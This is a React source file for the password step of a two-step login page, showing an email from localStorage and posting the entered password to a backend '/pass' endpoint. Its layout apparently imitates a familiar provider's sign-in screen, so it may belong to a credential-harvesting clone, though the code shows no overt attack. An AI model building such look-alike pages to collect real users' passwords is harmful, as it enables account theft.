import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import BASE_URL from "../components/urls";
import "../styles/Password.css"; // Import your custom CSS
import logo from "../assets/logo.png";
import FormErrMsg from "../components/FormErrMsg";
import { FaUserCircle } from "react-icons/fa";

// Validation schema for password
const schema = yup.object().shape({
  password: yup.string().required("Password is required"),
});

const Password = () => {
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const [email, setEmail] = useState("");

  // Retrieve the email from localStorage when the component loads
  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) {
      setEmail(storedEmail);
    } else {
      // If no email found, redirect to the email input page
      navigate("/");
    }
  }, [navigate]);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pass`, data) // Send email and password
      .then((response) => {
        console.log(response.data);
        navigate("/pass"); // Redirect to dashboard or any other page
        reset(); // Reset
      })
      .catch((error) => {
        console.error("Error:", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="password-container">
      <div className="header">
        <div className="logo">
          <img src={logo} alt="" />
        </div>
        <h1>Welcome</h1>
        <div className="profile">
          {" "}
          <FaUserCircle className="icon" />
          <span>{email}</span>
        </div>
      </div>

      <form className="password-form" onSubmit={handleSubmit(submitForm)}>
        <div className="input-container">
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            placeholder="Enter your password"
            {...register("password")}
            required
            className="password-input"
          />
        </div>
        <FormErrMsg errors={errors} inputName="password" />

        <div className="show-password">
          <input
            type="checkbox"
            id="showPassword"
            className="checkbox"
            checked={showPassword}
            onChange={() => setShowPassword((prev) => !prev)}
          />
          <div>Show password</div>
        </div>

        <div className="form-options">
          <a href="#another-way" className="try-another-way">
            Try another way
          </a>
          <button type="submit" className="submit-btn">
            {loading ? "Loading..." : "Next"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Password;
